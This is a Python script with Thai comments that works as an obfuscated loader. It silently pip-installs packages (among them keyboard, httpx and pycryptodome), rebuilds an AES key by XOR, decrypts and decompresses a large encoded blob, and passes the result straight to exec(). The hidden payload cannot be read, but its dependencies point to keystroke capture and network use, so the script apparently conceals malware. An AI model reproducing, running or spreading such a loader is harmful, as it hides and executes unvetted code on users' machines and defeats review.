
import sys, base64, zlib, subprocess

def _req_check(p, m=None):
    if m is None: m = p
    try:
        __import__(m)
    except ImportError:
        print(f"[*] Installing dependency: {p}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", p, "--quiet"])

# ติดตั้งตัวถอดรหัสก่อน
_req_check("pycryptodome", "Crypto")

# ติดตั้ง Module ที่แสกนเจอจากโค้ดของคุณ
_needed = ['rich', 'ctypes', 'keyboard', 'ujson', 'httpx', 'datetime', 'os', 'asyncio', 'subprocess']
for mod in _needed:
    _req_check(mod)

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _xor(p):
    from functools import reduce
    return reduce(lambda a,b: bytes(x^y for x,y in zip(a,b)), p)

_K = _xor([b'\x91\x15&@\xdex]\xf5\xb5m\xe09\xfb\x0c\xe4\x1f\xbfr{\xc1\xb8\xaf\x01V$\xad:Bb\xf5\xd2#', b'T\xbbX3\xe9\x8dWA"\xb2\xcc\xb2\xfe\x82\x16\xa3\xf28\x81\x91t\x1a&g\xcckeBe\xc9\x12l', b'Gq\xdd\xa1\xd3>\xf4\xf3\xdf\x1b\x8a\x7f\xea`6\xe1~\x13\x05u\xee\xa4\xe6&3\x92\xa9\xbf\xd3\xd7\xfe\x0b'])
_I = _xor([b'\xc2\x1c\xaa e\x04`MW\xee\xac\xb7\x01\xf2\x80-', b'\xeeuO\xad\x8c4(\xde\xcd\xb4\x9b\x02\xcb\xad{\x0e'])

def _decrypt_str(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16).decode("utf-8", "ignore")

def _decrypt_bytes(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16)

_enc = base64.b85decode('uqq0Ez(CU1#s)9pMNIm#S}3Toetlgcn>nSKmD~_bo|f4ys-kSJU8#oc>$nC6n1RxMMD_)LXB4um+<u(WF{;pVAZ+adzh&iuj`N29&MEdWd<p<&nPad3Ov&?%SUz=(X+RzXOWcK*pX)0NbdPRB*^_$8UPF|jVZ*I_*F}1EsfRjq0}stIYDt2|t_$sxCllwyQu78pLTI^Kzn-a=ekp)1tWj@BdIIL1<3Q!Y4pE<XKbl=~s}M4<j?W;h1c885zQvryKjq~Ke9vvb4z;1ka_3|?w=he@U)A{xMV{bcF3o-$`|az&=5mt&_5%=qk@X3npU}bGhQiku#{Q_1poE7lOLTz(`D%Y8Xi1q9SYgO^uDb$s9nfD?#@75{2}x6x!EOb#F>hU2tEgiQJ?bKPl1g@l5D`E#c8-58^-dwtLr1qgPl~GEwt`FT;f|uU8!*10tN4NUk3J}iI9g_{9)m(d7Tf;l&T_SJ{j0*`yvHMd1q4IBa8b%kwQ}}bvNQcd9`_bOc84jByxoL7OdtKv=pWPuC_Cg$Iay<<#-6{e;Lxlwu~VFv!Lf`8Yj+1n$;1ts@h}DX!m28kEI81O$?uNzSI5AblW`?dmU77&1of6tB*Wt5m#mJ;?EO55<I@siA2Yi9I5YvKlj<o8Z-d^*C+7_k;*V2im9diDF&II?^(IK#jwY~o|2Xo3=f-OwC)C^$vizXc+`rX9_x_$(jsduoU|mCfM=w3~v+@{zW3xNKjruIX+e@i;(p07%fQ&dHdGwn&JD)W)YgmWYz1pFpR^9ZLAn0HO+coO8NzA~I6kx#nwpp<=|AB&s66%xtoxg(RB5SSc{4ZOvcSf)^?8B4@i#dkW!eC;{4MXaV&h1u@@^v>@M#D0<)zd!>vtsIL1UNg7^0w<14!_ZbH56eo{LeIV52kz>8}%W0pXUrkw@Szr-f#Cr@C~L@EHMc?ddCrC>Zw!4YWna!kzg$uP|`hEhILPw0J#_#o@Hoy=0s-Y*4d;Ojin{qzEc!dxj*SZvlkC}!_?!5CP`h`Vi|pd>b1f0Vhm+I?j@)*t>@&&2Ob*wPwMovB!=4pC1lJ_Y`O9ryvcR_XTCo6gsg}Ka0*Fq3BdWc{aYsBnX9Q}$I(G14pU9|%|p{r!(hBtN_Kl>HRc+NtNZ17_OGhVsZ4Ew1Cxh}>kO4<>5##3lY8_0UWLp2J_7&?Zmi|z@;)OFfJf=5NfTvrfRuniZACMh;gL7vED9ppGQx4|ojMQ8JOVEYk{S{1<lXbvB!)CRRs=%62bH4`S*1mM$zwV6`nswi!VD@Te|$^_uFJO~6yRob5?c&P3|4zK!bJGNJr~GuP9+%GiJvM~0mkfa!)whjan43v&bYD5<=%c5v1$|e6O_KTH*;~){LG$3&#)=Eop(??#KEsU2&`5xI9t>e*~P&CAhvw%QkS>#l=sg`b~t=o#yd{(J0a;1Jvo=z3SDq}B%&cwS&o2B3BmX7N$L~yDYUhY4}79Gi0T2%j0@-h!&+rN-o>@Y?i4GN5@81UjjLlk<E1W`QWV-D4d$fT;L=0@eeWcJB-?Km&UAZ<`Gw>e1sE4GddC`ka`K-R92j+rNAu}Yk}+#c;Wh6KOnsV+-8kNO``upR`%qC>oW4}pjMwrVZltt$#23UOZkGP}R-I=T25nE}pV;QNBbVE)N?%QJS+lKdTWlXVudP{7O$V+f?ik<2EJNUW{rxFPWPkC5WNZl~oFngTS)`}$25JJqTx<FGXyZ68|Md*!M2IBD1R)3=APMb4rlUCeA^D3Fh60)g+%T7co@sUriqv95<w@_6(lJwrC{QMd?cI<2N~q)rwi&Y1uIjXDD85@SUP2dQg8KP0x)sc#v|mmhSM8?s1xgDkwyBr1m2B{y<A^7fzE^)xuIQAZp5bIUF+ZxJ`|*xbZ$bzb`cu0CdL(NYuFFrX^Ef&Qx(~*f<o&w4dNbc-)D*`yfv|->vGezQG<3Yr;R=45q?oH-`|qpa%*UKc@jMNQ_}X-$=PP0r&|x_Ng$t#81S?KFv%u=gLRK;T4$CmF)5|^k3{r@9gUpRo4@zqi+L4}ftzVQsS$M%n*M(;x{ae#Tw3yu|FP><BR<S2@%x@lIkV^VdTY0ssO6ijs+-31XBEP;woOq0^sb94y)k&XeXg{K+H0czpQ~e#j6KZXvO0%TFHw<0;5Z38g8ri7Ryozs$ofjIL0qP_-Y0c?mk$U6Sm8oa&Gdn;xt~Lbu8*?)VMU;}jx(br0ntaADi$gC=cL_+rY%m5Q$TLzD6UJ5N5>(WMTa=rM``L@omg^R-Hpy6kaVzSvtTckDmNsD)?KR!{k#tasae$vvTD8IZr0Qtz{zHXauD|LZQNY1?m+gVQi@Va|GjnV9gQqPW^_hDI4mwh@jMpt3VJD^I9`0d-K{;0*2JRIw)mOGOp8Y46V|blTd_fa4L!WSO6~!Jk?vX0s-PBMHr;;mcwth1s8zADWZWf(MwIu};-rJNm*uMZ>vGNgZhD`7%>a+G%V;ez+%G~K6&8uHCO<(#9;DfF5dl2k8&ptAvaC-_-h5SZfOq)78;9p`gWhX7D>8f)EymKqZ+v2bktFhjT(~NN)QGU@YGWJ`_WgMm{ytv6MwRk7Ry!Yrgo)e1xWV|nia<1j`tGFhx*iJB#h6&0p+pB9X2pbQEdwmKS+C!v}x{^N6?=aygnrsUz61w?RM*E3zXg1~gJxsr)7I<@ky|{uD)BXXCaGL#$_%z`6!Gf^zLOp#*G6KE^Neo=UEIU(Wd=!~4tjSAd9HNrg-Wq1oMI$C>L)?|r7_Q#|q1wV^ke<AuIyMH3<8X)%>ot8|uC=`+g#1hVRL@y?h5h5T7fnofPutCE9NA&V!2M5h7!blRiEK9o<oui*w8ov0p!$bV^Gjfk>WP&lODM=PMK={QNJr|BKcrQL$6KlYk@}F7pRyi<m_x%Ra6flMvbyqU5Z_k<SzS2$dEMJa6vAo8rB%LLlCb)V_FL{P_4-i?b=^jiA|0;Txm_2dHU-pqvLftZAwJ{gu7;B%IrrI^#Q@(<dZ^jvh8mwR$(CvsSfym)8RCPtTGx2H{)_pmqp01#JKWati$6VnT|47GVk#ReVniqQZ`>L_bg7p5yD$0Wov_MqseULAds%rqBVb82CE=)-C@fyP%5m99A*%n47e8)X`QQ#M(SQUKmVX^EA@Ns9H?ABI;dKr1WiNhJ(mGY0D^lSYn2nxu5ZKZN<pLZ`^*`aOKZ}z9Ji_0N&-7M}6*@`{X^HXblxeEtxNC#R5dhUgbC}=&%ss!XTi?`ylDvR4VeiKkHZ=IRjg*?fCAP>2c7Olal9^D$S6Ii6yTx(v$2N)vE}1<NpoMNAUSot_a%Mb)b%Dh>b)9|DQ?*`;bvTcf91ye5z|ca|dh-PutUU$XJ9O^{O&*Lf@f&5}^<1nI(1OSZy|(lBax_IE`iu@2*4s|vI6->S`zlr7(Fr5HNw&Kl*SP<;yTmk)F6^rfsb+=Rmkhb&dd?F0i<z?O8>tKAV+&K>J~S-C-N$VnKxHe_r6FZCiXf5}jA&|xvPjLiT?$hWr&qI@GVJPctQ>z4XwsaeX78I)@VtJVsLc}|Qe;R>k+AYlt}bbyBM(l8Y={t^fx;VgN*4)cfA4hID#v1WcvOOrq-xr_f~N&Q%x}DyJ2IFdZ%g)80(`N0f#uBJNb;Fbi@9RjEaZY?d<jKhX9+t5|GC)bSXAfjemUoL0NfK0BYkrOVhvH+bH5_Zf}f{K<2QoF9Z#UY0}ggx>ow4n;I|-$YkDL_LNs(a<7@=0$tRZ*#<PeZKNLlu6b%U8@tNT6U;_?RvBXos0Z|VcB@n~mLZ7B@<8RvXxTh_{+Vy0tV@(_NRS({O_%IijF~bSF$=LbGuwv@)sc|<Y_n}38Myf>r)J9QKuBQY@p$%WtcVW{a2zV#U9*F-=SQtK*6cAoGYFkGPNG51!_Meiu086PM*oADItg&XNDy=m<CHU!~>4UbYR(wKE*kQ9+n#@%55(@#}cv#ITn&L3{PySJ^r6-6dz{XWURHa!OZ6C|lSl_+evMl7HVNvI5M%2`Q+JuFbBwjx7NfyPB&i6v#qiOS@f5KTiYBZBhjb0|<ec`Uvd)B~v?kEpp19J=B6rN&YB1m^%uQq&2bNxnG6s0CY*xQkzO~Y@qe!Bd21VI#&%j)^7!P)8-y`kR2UgJ$s6vb^>hh%&`QW~V%vKF%x4>Gk=5Ob-r6bc~;ae~Q6l92q>YVY20EeQ}Q@eFQOy5Hc&9wxp&gSTI`2siSo@1Ve`zMPn{0#%-6eokJM&MWW8gbx70^?~dUnkk$Rt2O$yLTO`b;`;h!xGfW?w7w7kfUvK`Yl(U0$Y*fgw{t$R(7>vN+ax=L;ju{RcJL4=K@$rvHVc)B(I6^-(@Ur;846@b6tOgGBfwN|NLVeP6|6sGIk|IvH2X#cMF03{c(O!9yX;&~k&F1lyHhH<1_qfj6a}Rl8R`xC<1^K%K|mXUJusD;iv93rLVG56v`0D~%(S;B!MsMpgwuVL0HASVXyO&3M_WtJ)|+m$m_}#q)7C1~A0q<!P)`ao0ZLYzT3|?(Dl3&AlMw_(ubDgB5zRegI%mQ~ikyH;qKNZQ%GxD$H$5LzMB@hqRa+Ee5jw=2TXTyv^u_l}G!R+o+gLuL0yngxecwYiyvg1~aalJ;YZqlU|CXs<7<r#%NvhbxXoeh#PB3p)Uv~x&qHNL<qaMB8_1w9~SV!D8MAXM&9-mpt(7%l|QTX_PYF3FP0cuo9?$Mqhu7B2p5_T%?@|?M(Q#YD-pUF(do&t#}A+)W^iA7;pU99|n<WUqRLs+2W%v;N@MDy^d{@C~cWb$TLykCT7lhi*+s+U63-b(yI#3u%IJd*GqSW7+>duBuAYD`sQz^b<;n3<@r&@DK}@kBx_Y#WV$_PUe+Ey1u7Pb8U_I0w!k19y!imFd|A*2g+I6{c*}@3=8gOVG8ZVFFYCvu?bR;Mq5jjYW0)H2)K+j$@!Cj(#<L8N4t}rRjC>x`x_}MJ99s#}jWBioOJiiO)IB-dr=)F?W+@nJ^OX>f>glCvzqp_lEL9Pe_77%700Fj@Ug_*#i%pE>sO;oUQM$@cDVOL*rMNuG}07mPIJ$O+=ICm^Jh1X<x1|7SF(r6Y4ExZcN$@4xW!yV4qs>%r(Jqi&j;*I#xtBj)C8kgC~m`CT{mc6+CGbm%UFyu3DT2Mbc%c#6JsSkW2rgSO{vOhssKU;UmBoFPpAK>6vCYDPNA7ix52HI$BqXQB$jg)<iCD#1{E^o7Az!O*xk`_4m{uIi*Pp!l0|WZS|^K_?XWkunmhW__28;_pWjNFpQDpt8jA@;wZcH35`QCgAub>5o9Yd<&8Ih7L+*?dAhd`33_rh)XvCGEV9Ynx_-fVNSadICs5suEHm$wJKvIu=*v6FaDRsy%NjYni(eWULmNER)mKY8+P#Bt*vIjU174Y_!)W^^uV|)ocQ<%yzOhUkX5=!7@Q(ZSBE+rkSzxojUu8ncEnCGUOY&9iuCAel7OHbcBmQ|1Fz!guYUd%ECEb6naTWvTJFOEeJ#j!4Uw94-@mS#@vR3@a734ALQCY_nlSItxmeadQku~yVN7aYH<1$WZXp-*7PH%fUsfC>rKceGdN#ca~-T&0^8)G>q_p1rZVPlQz!?4LTmMc-%`63Jr#>R&#&=5qlR||mlRi3TxkJlh2ToC&C(pxCJM{+$BsmeLl1GH|Q9sewqg%Zbkyi_b8y~Gv*#)X11F$0IKt=&+mv&mOk4OAr{e2ddg8f-=>#iv%hiB&Ga3-{ZheDy%{QDE)u>1DmsRI8Fyn4HjGzPr*ZI-V;v&{~%39yMBZW|^mq2SAC!?anvD&>ytZW*tBL%x1v6z08w=$R1dAGbQEv=FI@YSdYmAJ76TSJz?*%*kt~i#~lbw^)$Bu03#;ozZlVxzQsG56FJ}>6xmr5S`R@&UzNEt0*att_W3*$&d+|+z?(T)5sNp??oqUvvv+gG5nk<~fz3IoBo%Xr5oLh8c%0GMEGVAT8-?(po{e?>r(JH>%22}8x=*7#**e=Vuvnpo@$+_2w=3*c657OZroz>(?^%B{+ux3#X(rMVL^VAR$!n9IJaSltvzw#EGLC#3sbH7{ZDMHbrmCGxyZaU=(}Bh@aZAd}#Ou3*!Qv$)M9qxxCc8%-y=C$+BGJ5V_L+F*?jV}ibZ=()o6>;$tzmn(98nNn%XCV|g>O*H3)l)^;hz$}iqkBBqW&Y?iy?;_0bVsh`nkxxc?I_vbF_NuSyUkK*&co3gNdD4yUd(O6UMm69UzRGUxn%}vEjo2_dX?dHRU!mvvU;Xp7-)s^-%_{v)vLGl4<zxb+J}N`y$jEgiiRf;!_x7W^qfkxMW$~jr`3&z;}(FE8ytzE+(Gwl6v%#%^C}L1=;W6vuk+?!FiLim4{f>78Hm|VmCz)VS7M?1r|>a+|-a`mNVc7!*aT1BRg?rqwLZ2n>I3^QwbW+R9EL1+==P_Ng(j7P>V2UnFiv-ca5j~$Yx?q0P;ZD)aj30+bg>#R`UJ*IQ=huMCO@LnJC|ZUjuHQIM;|VLjL1;?9#B$0;B_o>9B7$Aw9!_vC_Cfpd?hmgA^12UV*kB-<SoV9g9VHnegVBT~?k@_5OLf+4$=0ebGdy+N$mpx&G&eG;UUsjIrHW+$b~QoXMZ>ne1h^fT_edpI@=NdsbmaMu<3{2!mOt(8ZP#YoKYYF3Dp=|8c>(WxJCF9sJ06jp!pMD0+vXqhB&g25ppeCrs-JI_5o$!}r&qEO=;KfN}jHbUAsVX1t-Jr}qx_#g-BX_OFStFog8w8rWgkZt;)P=q<xflcB<VTjZW~3tSoUEc5uy;P*OTY^^{z;<E!==U2;{Ydhy_AY~w9PyC;SO&C{1F@SxwEW9Xw7TcQ46(3HHTaxv8uo6uznqtBBA==l${yK1=;kP(TsB0~YWC&lwh^rGIOM7mQFPF3jVz&yd#5}*{{Ux3(upEJUVtMqaKZ67ZZII!g6et{9%z{359SQHeATCe%gL`qvg2LSru<FTmPxO!R)l>I<^&ARt3H_(#R<1slPIDqhR~5YoD!XBG)lg<QNk1C-R*5{CiFu>Z!(j8I#*&>{2Ak*Sm|Ze6t0S!PnvHa}jFgZlQ<&$;pmR#jK;YF_R#$KJe1H~>6z{Q*iXJKlbw+g@I5@A!pC9w`;89#2@!=&#$((`y&d}H$')
_raw = unpad(AES.new(_K, AES.MODE_CBC, _I).decrypt(_enc), 16)

# EXECUTE UNIVERSAL CODE
exec(zlib.decompress(_raw).decode('utf-8'), {
    "__name__": "__main__",
    "__builtins__": __builtins__,
    "_decrypt_str": _decrypt_str,
    "_decrypt_bytes": _decrypt_bytes,
})
